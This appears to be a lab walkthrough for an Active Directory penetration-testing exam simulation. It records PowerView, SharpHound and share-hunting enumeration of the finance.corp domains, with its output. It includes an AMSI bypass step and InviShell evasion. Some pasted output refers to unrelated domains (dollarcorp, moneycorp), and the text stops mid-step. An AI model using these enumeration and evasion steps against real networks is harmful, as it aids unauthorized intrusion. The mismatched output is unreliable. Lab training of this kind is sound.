# Attacker Machine (`studvm`)

## ???

### Domain Enumeration

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::dca5:8ad4:c3fa:8934%4
   IPv4 Address. . . . . . . . . . . : 172.16.100.1🌐
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254
```

`cd C:\AD\Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

#### Domain Enumeration | Domains, Forests, Trusts (with PowerView)

**Domain Enumeration | Forests**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-Domain`:
```
Forest                  : finance.corp🏰
DomainControllers       : {tech-dc.tech.finance.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

`Get-Forest`:
```
RootDomainSid         : S-1-5-21-1712611810-3596029332-2671080496
Name                  : finance.corp🏰
Sites                 : {Default-First-Site-Name}
Domains               : {finance.corp🏛️, tech.finance.corp🏛️}
GlobalCatalogs        : {finance-dc.finance.corp, tech-dc.tech.finance.corp}
ApplicationPartitions : {DC=ForestDnsZones,DC=finance,DC=corp, DC=DomainDnsZones,DC=tech,DC=finance,DC=corp, DC=DomainDnsZones,DC=finance,DC=corp}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : finance.corp🏛️
Schema                : CN=Schema,CN=Configuration,DC=finance,DC=corp
SchemaRoleOwner       : finance-dc.finance.corp
NamingRoleOwner       : finance-dc.finance.corp
```

**Domain Enumeration | Domains**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-ForestDomain -Verbose`:
```
Forest                  : finance.corp
DomainControllers       : {finance-dc.finance.corp}🖥️
Children                : {tech.finance.corp}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : finance-dc.finance.corp
RidRoleOwner            : finance-dc.finance.corp
InfrastructureRoleOwner : finance-dc.finance.corp
Name                    : finance.corp🏛️

Forest                  : finance.corp
DomainControllers       : {tech-dc.tech.finance.corp}🖥️
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

**Domain Enumeration | Trusts**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainTrust`:
```
SourceName      : tech.finance.corp🏛️
TargetName      : finance.corp🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 2/2/2022 6:53:13 AM
WhenChanged     : 3/11/2025 8:53:24 AM
```

`Get-ForestTrust`:
```
```
❌

| Forest       | Domain              | Parent Domain   | Domain Controllers                | Trusts                              |
|-------------|---------------------|----------------|-----------------------------------|-------------------------------------|
| finance.corp | finance.corp       | -              | finance-dc.finance.corp          | -                                   |
| finance.corp | tech.finance.corp  | finance.corp   | tech-dc.tech.finance.corp        | Bidirectional trust with finance.corp (WITHIN_FOREST) |

#### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)

**Domain Enumeration | Users**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainUser`:
```
pwdlastset             : 3/16/2022 3:56:32 AM
logoncount             : 52
badpasswordtime        : 3/16/2022 3:39:50 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/11/2025 1:52:58 AM
samaccountname         : Administrator
logonhours             : @{Tuesday=System.Collections.Hashtable; Friday=System.Collections.Hashtable; Wednesday=System.Collections.Hashtable; Saturday=System.Collections.Hashtable;
                         Thursday=System.Collections.Hashtable; Monday=System.Collections.Hashtable; Sunday=System.Collections.Hashtable}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 3/11/2025 8:52:58 AM
instancetype           : 4
usncreated             : 8196
objectguid             : ad9be59e-222e-4d75-8861-bf68e8f13b44
lastlogoff             : 12/31/1600 4:00:00 PM
whencreated            : 2/2/2022 6:53:13 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:30 AM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM...}
usnchanged             : 65578
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tech,DC=finance,DC=corp, CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp,
                         CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
lastlogon              : 3/11/2025 1:59:35 AM
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid              : S-1-5-21-1325336202-3661212667-302732393-500
primarygroupid         : 513
iscriticalsystemobject : True
name                   : Administrator

[SNIP]
```

`whoami`:
```
tech\studentuser👤
```

`Get-DomainUser -Name 'studentuser'`:
```
logoncount            : 17
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=student user,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : student user
lastlogontimestamp    : 3/11/2025 1:59:44 AM
userprincipalname     : studentuser
samaccountname        : studentuser👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/11/2025 8:59:44 AM
instancetype          : 4
usncreated            : 20893
objectguid            : f0a2b1ef-88bb-4463-8037-6d5f94c5cac3
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/3/2022 3:47:16 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/3/2022 3:47:16 PM, 1/1/1601 12:00:01 AM}
givenname             : student
usnchanged            : 65641
lastlogon             : 3/11/2025 2:10:35 AM
badpwdcount           : 0
cn                    : student user
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1108
primarygroupid        : 513
pwdlastset            : 3/11/2025 1:59:37 AM
name                  : student user
```

`Get-DomainUser | select -ExpandProperty samaccountname`:
```
Administrator👤
Guest👤
krbtgt👤
studentuser👤
techservice👤
databaseagent👤
sqlserversync👤
```

**Domain Enumeration | Computers**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainComputer | select -ExpandProperty samaccountname`:
```
TECH-DC$🖥️
STUDVM$🖥️
MGMTSRV$🖥️
TECHSRV30$🖥️
DBSERVER31$🖥️
```

`Get-DomainComputer | select -ExpandProperty dnshostname`:
```
tech-dc.tech.finance.corp
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`notepad C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

**Domain Enumeration | Groups**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGroup | select -ExpandProperty samaccountname`:
```
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
```

`Get-DomainGroupMember -Identity 'RDPUsers'`:
```
```
❌

`Get-DomainGroup -UserName 'studentuser'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users👥
whenchanged            : 2/2/2022 6:54:20 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-513
objectclass            : {top, group}
cn                     : Domain Users
instancetype           : 4
usnchanged             : 12320
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Users
description            : All domain users
memberof               : CN=Users,CN=Builtin,DC=tech,DC=finance,DC=corp
usncreated             : 12318
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Users,CN=Users,DC=tech,DC=finance,DC=corp
objectguid             : f1cf540d-3d23-47be-889d-d8c1e2a6b01c
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroup -Identity 'Domain Admins'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins👥
whenchanged            : 2/2/2022 7:09:29 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-512
name                   : Domain Admins
cn                     : Domain Admins
instancetype           : 4
usnchanged             : 12905
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM, 1/1/1601 6:12:16 PM}
objectguid             : 737831e2-8781-4176-8b69-81798b10da94
description            : Designated administrators of the domain
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=tech,DC=finance,DC=corp, CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
member                 : CN=Administrator👤,CN=Users,DC=tech,DC=finance,DC=corp
usncreated             : 12315
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, group}
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : tech.finance.corp
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
MemberDomain            : tech.finance.corp
MemberName              : Administrator👤
MemberDistinguishedName : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1325336202-3661212667-302732393-500
```

`Get-DomainGroupMember -Identity 'Enterprise Admins'`:
```
```
❌

`Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain 'finance.corp'`:
```
GroupDomain             : finance.corp
GroupName               : Enterprise Admins👥
GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=finance,DC=corp
MemberDomain            : finance.corp
MemberName              : Administrator👑
MemberDistinguishedName : CN=Administrator,CN=Users,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
```

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`cd /AD/Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\SharpHound.ps1`

`Invoke-BloodHound -CollectionMethod All`:
```
2025-03-11T08:07:18.9902876-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2025-03-11T08:07:18.9902876-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-11T08:07:19.0059188-07:00|INFORMATION|Initializing SharpHound at 8:07 AM on 3/11/2025
2025-03-11T08:07:19.1310778-07:00|WARNING|Common Library is already initialized
2025-03-11T08:07:19.1466851-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-11T08:07:19.1935793-07:00|INFORMATION|Beginning LDAP search for tech.finance.corp
2025-03-11T08:07:19.2404237-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-03-11T08:07:19.2404237-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-03-11T08:07:49.4776665-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 100 MB RAM
2025-03-11T08:08:04.5208726-07:00|INFORMATION|Consumers finished, closing output channel
2025-03-11T08:08:04.5833002-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-03-11T08:08:04.6770770-07:00|INFORMATION|Status: 93 objects finished (+93 2.066667)/s -- Using 102 MB RAM
2025-03-11T08:08:04.6770770-07:00|INFORMATION|Enumeration finished in 00:00:45.4891943
2025-03-11T08:08:04.6926864-07:00|INFORMATION|Saving cache with stats: 58 ID to type mappings.
 59 name to SID mappings.
 1 machine sid mappings.
 5 sid to domain mappings.
 0 global catalog mappings.
2025-03-11T08:08:04.6926864-07:00|INFORMATION|SharpHound Enumeration Completed at 8:08 AM on 3/11/2025! Happy Graphing!📌
```

![BloodHound Legacy | Analysis - Find all Domain Admins](crtp_exam_simulation_bloodhound_find_all_domain_admins.png)

![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)

![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)

#### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)

**Domain Enumeration | ACLs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'studentuser'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Admins'}`:
```
```
❌

`Get-PathAcl -Path '\\tech-dc.tech.finance.corp\sysvol'`:
```
Path              : \\tech-dc.tech.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

`Get-PathAcl -Path '\\finance-dc.finance.corp\sysvol'`:
```
Path              : \\finance-dc.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
```
```
❌

**Domain Enumeration | OUs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainOU`:
```
description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9}📑,CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainOU | select -ExpandProperty name`:
```
Domain Controllers🗂️
```

???

`Get-DomainObject -SearchBase 'OU=Domain Controllers,DC=tech,DC=finance,DC=corp' -Verbose`:
```
[SNIP]

description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9}📑,CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp

pwdlastset                    : 3/11/2025 1:48:39 AM
logoncount                    : 54
msds-generationid             : {159, 64, 30, 21...}
serverreferencebl             : CN=TECH-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=finance,DC=corp
badpasswordtime               : 12/31/1600 4:00:00 PM
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION📌
distinguishedname             : CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 1:49:27 AM
samaccountname                : TECH-DC$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/11/2025 8:49:27 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
objectguid                    : 1afeeb35-bf84-44ff-8c6b-90b52fa90393
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 2/2/2022 6:54:19 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
serviceprincipalname📌        : {ldap/tech-dc.tech.finance.corp/DomainDnsZones.tech.finance.corp, ldap/tech-dc.tech.finance.corp/ForestDnsZones.finance.corp,Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/tech-dc.tech.finance.corp, TERMSRV/TECH-DC...}
usncreated                    : 12293
usnchanged                    : 65558
lastlogon                     : 3/11/2025 1:55:07 AM
badpwdcount                   : 0
cn                            : TECH-DC
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1000
primarygroupid                : 516
iscriticalsystemobject        : True
name                          : TECH-DC
ridsetreferences              : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
dnshostname                   : tech-dc.tech.finance.corp

ridnextrid                : 1600
usncreated                : 12423
name                      : RID Set
ridpreviousallocationpool : 9015136355904
whenchanged               : 2/8/2022 7:34:07 AM
objectclass               : {top, rIDSet}
cn                        : RID Set
usnchanged                : 38451
dscorepropagationdata     : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
ridallocationpool         : 9015136355904
ridusedpool               : 0
distinguishedname         : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
showinadvancedviewonly    : True
whencreated               : 2/2/2022 6:54:29 AM
instancetype              : 4
objectguid                : 179af1dc-255b-4047-8af9-037e6d1beb7d
objectcategory            : CN=RID-Set,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated             : 12871
name                   : DFSR-LocalSettings
whenchanged            : 2/2/2022 7:05:01 AM
objectclass            : {top, msDFSR-LocalSettings}
showinadvancedviewonly : True
usnchanged             : 12898
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
msdfsr-flags           : 48
cn                     : DFSR-LocalSettings
msdfsr-version         : 1.0.0.0
distinguishedname      : CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated            : 2/2/2022 7:00:00 AM
instancetype           : 4
objectguid             : ec8f349d-1d3a-4857-baa9-a26a54c489e6
objectcategory         : CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated                  : 12874
name                        : Domain System Volume🗂️
msdfsr-memberreference      : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
whenchanged                 : 2/2/2022 7:00:00 AM
objectclass                 : {top, msDFSR-Subscriber}
showinadvancedviewonly      : True
usnchanged                  : 12874
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
cn                          : Domain System Volume
objectcategory              : CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : 1e2e84c2-e6d5-4143-be3f-1bf04595a5fc
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

msdfsr-stagingpath          : C:\Windows\SYSVOL\staging areas\tech.finance.corp
usncreated                  : 12875
msdfsr-options              : 0
name                        : SYSVOL Subscription
whenchanged                 : 2/2/2022 7:05:01 AM
msdfsr-rootpath             : C:\Windows\SYSVOL\domain📌
objectclass                 : {top, msDFSR-Subscription}
msdfsr-readonly             : False
cn                          : SYSVOL Subscription
usnchanged                  : 12899
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
objectcategory              : CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
msdfsr-enabled              : True
showinadvancedviewonly      : True
msdfsr-contentsetguid       : {103, 232, 225, 147...}
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : da61a328-e550-4cb8-adcc-92ad27b52e82
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

[SNIP]
```

???

**Domain Enumeration | GPOs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGPO`:
```
[SNIP]

flags                    : 0
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy📑
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 2/2/2022 6:53:07 AM
versionnumber            : 1
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}📑
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
usnchanged               : 7792
dscorepropagationdata    : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:00:00 AM}
objectguid               : 45fa190f-e4ce-44ff-af48-9afe0e692569
iscriticalsystemobject   : True
gpcfilesyspath           : \\tech.finance.corp\sysvol\tech.finance.corp\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}📁
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=tech,DC=finance,DC=corp
whencreated              : 2/2/2022 6:53:07 AM
showinadvancedviewonly   : True
usncreated               : 7792
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=finance,DC=corp

[SNIP]
```

`Get-DomainGPO | select -ExpandProperty displayname`:
```
Default Domain Policy📑
Default Domain Controllers Policy📑
```

`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📁
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

???

`notepad C:/AD/Tools/FindInterestingRightsDCsGPO.ps1`:
```powershell
Get-DomainObjectAcl -Identity (Get-DomainOU -Identity 'Domain Controllers').gplink.substring(11,(Get-DomainOU -Identity 'Domain Controllers').gplink.length-72) -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDACL|GenericAll|WriteOwner" } |
ForEach-Object {
    $sam = ConvertFrom-SID $_.SecurityIdentifier
    [PSCustomObject]@{
        SamAccountName       = $sam
        ActiveDirectoryRights = $_.ActiveDirectoryRights
    }
} | Format-Table SamAccountName, ActiveDirectoryRights
```

`C:/AD/Tools/FindInterestingRightsDCsGPO.ps1`:
```
SamAccountName                                                                                          ActiveDirectoryRights
--------------                                                                                          ---------------------
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\devopsadmin👤     CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
mcorp\Enterprise Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Local System            CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
```

???

![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)

![BloodHound Legacy | Node Info: Applocker - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_01.png)

![BloodHound Legacy | Node Info: DevOps Policy - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_02.png)

![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)

#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)

**Domain Enumeration | Shares**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerHuntShares.psm1`

`type C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
